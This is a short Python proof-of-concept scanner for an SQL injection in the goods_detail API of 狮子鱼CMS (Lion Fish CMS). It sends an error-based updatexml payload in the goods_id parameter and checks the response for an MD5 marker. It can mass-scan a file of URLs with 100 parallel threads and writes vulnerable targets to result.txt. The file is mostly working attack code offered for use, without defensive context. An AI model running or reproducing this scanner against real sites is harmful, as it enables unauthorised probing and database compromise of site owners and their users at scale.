import argparse,requests,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    text = """███████╗ ██████╗ ██╗     
██╔════╝██╔═══██╗██║     
███████╗██║   ██║██║     
╚════██║██║▄▄ ██║██║     
███████║╚██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝
         author = wuhu
         version=1.1.1                """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="狮子鱼CMS-sql注入")
    parser.add_argument('-u','--url',type=str,dest='url',help='please input your url')
    parser.add_argument('-f', '--file', type=str, dest='file', help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,MD5(1),0x7e),1)'
    proxies = {
            'http':'http://127.0.0.1:8080',
            'https':'http://127.0.0.1:8080',
        }
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=5,proxies=proxies)
        # print(res1.text)
        match = re.findall(r"<h1>SQLSTATE\[HY000\]: General error: 1105 XPATH syntax error: '(.*?)'</h1>", res1.text,re.S)
        if '~c4ca4238a0b923820dcc509a6f75849' in match[0]:
            print(f'[+]{target}存在漏洞')
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        pass


if __name__ == '__main__':
    main()